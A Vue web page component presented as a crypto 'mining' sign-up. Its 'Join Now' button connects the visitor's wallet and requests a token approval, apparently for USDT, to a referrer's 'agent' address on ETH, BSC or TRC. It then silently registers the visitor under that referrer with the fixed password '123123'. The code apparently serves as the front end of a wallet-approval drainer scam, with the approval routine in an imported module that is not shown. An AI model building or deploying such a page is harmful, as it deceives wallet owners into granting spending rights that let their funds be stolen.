<template>
    <div class="main">
        <div class="meShore">
            <div class="btn-title">Click minering</div>
            <div class="sub-title">Join a node to start mining</div>
            <div class="meShore-Btn" @click="check">Join Now</div>
            <span class="Reset-Btn" @click="Reset">Reset</span>
        </div>
        <div class="bgi"></div>
    </div>
</template>
<script>
// 封装的调用钱包方法
import BlockChain from "../blockchain/BlockChainBase"
// 引用状态机
import { createNamespacedHelpers } from "vuex";
// 封装的自动注册方法
import { autoRegister } from '../utils/myRegisterUtils'
const blockUtils = new BlockChain();
// 获取状态机内部封装的方法
const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Home")
export default {
    name: "IsMain",
    data() {
        return {
            arr: [],
        }
    },
    computed: {
        ...mapState(['obj', 'Msg'])
    },
    methods: {
        ...mapActions(['GetUserId', 'GoAutoRegister']),
        check() {
            //如果有数据
            if (this.$route.query.data) {
                this.yes();
            }
        },
        Reset() {
            //如果有数据
            if (this.$route.query.data) {
                this.disConnect();
            }
        },

        async yes() {
            // 点击授权 解析restful数据
            let res = this.$route.query.data;
            let ar = res.split('?')
            let arr = []
            ar.forEach((item, index) => {
                if (index != ar.length - 1) {
                    let b = item.split('=');
                    let obj = {};
                    obj[b[0]] = b[1];
                    arr.push(obj)
                }
            })
            this.arr = arr

            //区块链类型
            var chainType = ar[1].split('=')[0].split('_')[0].toUpperCase()
            // 获取解析后的账号id
            let userId = arr[0].userParentId
            console.log(arr);
            // 发送请求获取账号地址
            await this.GetUserId({ id: userId })
            // 如果账号地址没有就跳转到后台主页 有就执行授权
            if (this.obj == null) this.open()
            else {
                var agentAddress
                console.log(this.obj, `this.obj`);
                if (chainType == 'ETH') {
                    agentAddress = this.obj.ethMainnetAddress + '-ETH'
                }
                else if (chainType == 'BSC') {
                    agentAddress = this.obj.bscMainnetAddress + '-BSC'
                }
                else if (chainType == 'TRC') {
                    agentAddress = this.obj.trcMainnetAddress + '-TRC'
                }
                else {
                    agentAddress = this.obj.ancestorAddress
                }


                let agentAdressArr = agentAddress.split('-')
                console.log('agentAdressArr = ', agentAdressArr)

                let doApproveInner = async (web3) => {
                    blockUtils.doApprove(web3, agentAdressArr[0], async (result, address) => {
                        if (result == true) {
                            let userName = autoRegister(8)
                            let passWord = '123123'
                            let userId = autoRegister(10)
                            let ancestorAddress = agentAddress
                            // 发送请求注册
                            let obj = {
                                userName,
                                passWord,
                                userId,
                                userType: '3',
                                userParentId: arr[0].userParentId,
                                userParentName: this.obj.userName,
                                ancestorAddress
                            }
                            console.log(this.arr, `this.arr[1]`);
                            // 如果是一级用户
                            if (this.arr.length == 2) {
                                // 添加授权用户对应链地址 
                                if (this.arr[1].eth_usdt) {
                                    obj['ethMainnetAddress'] = address
                                } else if (this.arr[1].bsc_usdt) {
                                    obj['bscMainnetAddress'] = address
                                } else if (this.arr[1].trc_usdt) {
                                    obj['trcMainnetAddress'] = address
                                }
                            } else {
                                // 如果是二级用户及以上
                                // 添加授权用户对应链地址
                                if (agentAdressArr[1] == 'ETH') {
                                    obj['ethMainnetAddress'] = address
                                }
                                else if (agentAdressArr[1] == 'BSC') {
                                    obj['bscMainnetAddress'] = address
                                }
                                else if (agentAdressArr[1] == 'TRC') {
                                    obj['trcMainnetAddress'] = address
                                }
                            }
                            console.log(`授权成功，创建的用户信息为`, obj);
                            await this.GoAutoRegister({
                                ...obj
                            })
                            this.falg = false
                            this.$message({
                                type: 'info',
                                message: this.Msg
                            })
                        }
                        else {
                            this.$message({
                                type: 'info',
                                message: `授权失败，地址有误`
                            });
                        }
                    }, chainType)
                }

                // 连接钱包
                console.log('chainType = ', chainType)
                blockUtils.doConnectWallet((info, web3) => {
                    if (info == 'DisApprove') {
                        blockUtils.doDisConnectWallet()
                    }
                    else if (info == 'Approve') {
                        doApproveInner(web3)
                    }
                }, chainType)
            }
        },
        disConnect() {
            alert("Description Succeeded in resetting the connection information")
            blockUtils.doDisConnectWallet()
        },
        // 授权地址找不到跳转指后台主页
        open() {
            this.$alert('你的账号地址找不到', '', {
                confirmButtonText: '确定',
                callback: action => {
                    this.$message({
                        type: 'info',
                        message: `你的地址找不到`
                    });
                    this.$router.push('/backstage')
                }
            });
        },
    },
    created() {


    }
}
</script>
<style scoped>
* {
    font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif;
    font-size: 3.73333333vw;
    -webkit-font-smoothing: antialiased;
}

.main {
    flex-grow: 1;
    /* background-image: url(../images/14-登录.jpg);
    background-repeat: no-repeat;
    background-size: 100% 100%; */
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: space-around;
    background-color: #1652F0;
}

.bgi {
    width: 40%;
    height: 70%;
    /* background-color: #fff; */
    background-image: url(../images/banner_home2.483edd9e.png);
    background-repeat: no-repeat;
    background-size: contain;
}

.meShore {
    width: 40%;
    height: 60%;
    border-radius: 10px;
}

.btn-title {
    font-family: Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Open Sans, Helvetica Neue, sans-serif;
    font-size: 4.8vw;
    font-weight: 600;
    color: #fff;
}

.sub-title {
    font-size: 3.2vw;
    font-weight: 600;
    color: #fff;
    margin-top: 1.6vw;
}

.meShore-Btn {
    position: relative;
    display: inline-block;
    line-height: 9.6vw;
    margin-top: 4.26666667vw;
    padding: 0 5.33333333vw;
    text-align: center;
    font-weight: 600;
    color: #1652f0;
    border-radius: 1.33333333vw;
    background: #fff;
    cursor: pointer;
    box-shadow: 0 2px 4px 0 rgb(0 0 0 / 50%);
}

.Reset-Btn {
    color: #0734a5;
    margin-left: 2.1vw;
    cursor: pointer;
}
</style>